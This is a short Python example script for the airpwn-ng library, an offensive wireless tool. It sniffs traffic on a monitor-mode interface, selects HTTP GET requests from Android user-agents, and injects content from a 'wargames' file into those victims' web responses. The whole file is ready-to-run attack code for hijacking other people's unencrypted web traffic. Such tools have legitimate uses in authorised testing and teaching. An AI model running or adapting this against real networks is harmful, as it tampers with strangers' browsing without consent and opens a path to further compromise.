import lib.airpwn_ng as AIRPWN_NG

#EXAMPLE API
#Target: GET requests with Android in them (user-agent) and inject wargames
vp=AIRPWN_NG.VictimParameters(inject_file="example-injects/wargames",in_request="Android")
ph=AIRPWN_NG.PacketHandler(i="mon0",victim_parameters=vp)
snif=AIRPWN_NG.Sniffer(ph,m="mon0")
snif.threaded_sniff()
